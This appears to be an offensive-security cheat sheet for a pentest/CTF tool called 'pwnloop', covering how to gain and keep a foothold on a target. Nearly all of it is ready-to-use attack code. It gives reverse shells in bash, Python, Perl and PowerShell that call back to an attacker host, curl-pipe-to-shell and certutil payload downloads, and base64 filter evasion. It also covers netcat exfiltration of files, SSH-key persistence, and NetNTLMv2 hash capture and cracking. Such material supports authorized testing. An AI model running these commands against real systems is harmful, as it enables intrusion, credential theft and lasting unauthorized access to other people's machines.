# Foothold: shells, upgrades, transfers

## Your address

Payloads must call back to the **tun0** address, not the container's Docker IP.

```bash
LHOST=$(pwnloop x "ip -4 -o addr show tun0 | awk '{print \$4}' | cut -d/ -f1")
```

## Listener

Start it before firing the payload. Run it in a background shell so you can keep
working while it waits.

```bash
pwnloop x "rlwrap nc -lvnp 4444" &      # rlwrap gives arrow keys/history if present
pwnloop x "nc -lvnp 4444" &
```

## Reverse shells

```bash
# bash
bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
# sh, when bash is absent
sh -i >& /dev/tcp/LHOST/4444 0>&1
# mkfifo, most portable
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 4444 >/tmp/f
# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
# perl
perl -e 'use Socket;$i="LHOST";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");'
# powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

When injecting through a URL, URL-encode the payload — `&`, `|`, `;`, spaces and
`>` will otherwise be eaten by the parameter parser. Base64-wrapping is the most
reliable form through awkward filters:

```
echo <base64> | base64 -d | bash
```

## TTY upgrade (do this immediately)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then, in the shell:
export TERM=xterm
# Ctrl-Z, then on the attacker side:
stty raw -echo; fg
# back in the shell:
stty rows 50 cols 200
```
Without this you lose the shell on the first Ctrl-C, cannot use `su`, `ssh`, or
any interactive prompt, and tab completion is dead.

## File transfer to the target

```bash
pwnloop x "cd /engagements/$NAME/www && python3 -m http.server 8000" &
# on target:
curl http://LHOST:8000/linpeas.sh | sh
wget http://LHOST:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
# windows:
certutil -urlcache -f http://LHOST:8000/winPEASx64.exe wp.exe
powershell -c "iwr http://LHOST:8000/wp.exe -o wp.exe"
```

Pre-staged binaries live in `/opt/static/` in the container — copy them into the
engagement's `www/` directory rather than downloading from the internet.

No outbound HTTP from the target? Use SMB:
```bash
pwnloop x "impacket-smbserver share /engagements/$NAME/www -smb2support"
# target: copy \\LHOST\share\file.exe .
```

## File transfer from the target

```bash
# attacker
pwnloop x "nc -lvnp 9001 > /engagements/$NAME/loot/out.bin"
# target
nc LHOST 9001 < /path/file
# or, small files, straight through the shell
base64 -w0 /path/file      # then decode locally
```

## Stabilising access

Once you have a user shell, plant persistence you control: add your public key
to `~/.ssh/authorized_keys` if SSH is open. It survives shell drops and makes
the rest of the engagement far less fragile.

```bash
pwnloop x "ssh-keygen -t ed25519 -N '' -f /engagements/$NAME/loot/id_ed25519"
# target: echo '<pubkey>' >> ~/.ssh/authorized_keys
pwnloop x "ssh -i /engagements/$NAME/loot/id_ed25519 user@$T"
```

Log the flag as soon as you can read it:
```bash
cat ~/user.txt        # linux
type C:\Users\<u>\Desktop\user.txt   # windows
```

## When a capture tool logs nothing

`impacket-smbserver` and `responder` can capture a NetNTLMv2 correctly while
printing nothing at all. A silent listener is not evidence the coercion failed —
restarting it a third time is wasted time. Put a capture on the callback
interface and read the wire, which is ground truth:

```bash
pwnloop x "timeout 30 tcpdump -i tun0 -nn 'host <target> and port 445' -w /engagements/<e>/scans/coerce.pcap"
# trigger the coercion, then:
pwnloop x "tshark -r /engagements/<e>/scans/coerce.pcap -Y ntlmssp -T fields \
  -e ntlmssp.auth.username -e ntlmssp.auth.domain \
  -e ntlmssp.ntlmserverchallenge -e ntlmssp.auth.ntresponse"
```

An inbound SYN followed by a ~550-byte session-setup packet *is* the
`NTLMSSP_AUTH`. Reassemble the fields as
`user::domain:challenge:<ntresponse[:32]>:<ntresponse[32:]>` — the challenge is
`aaaaaaaaaaaaaaaa` when impacket served it — and feed that to
`john --format=netntlmv2`.

Two traps around coercion:

- **Windows negative-caches the UNC path**, so a second attempt against the same
  `\\ip\share` produces no callback at all. Vary the share name each time.
- **`pkill -f smbserver.py` matches its own shell**, killing the wrapper that
  was about to restart the listener. Match a path fragment the launcher does not
  contain, or kill by PID.
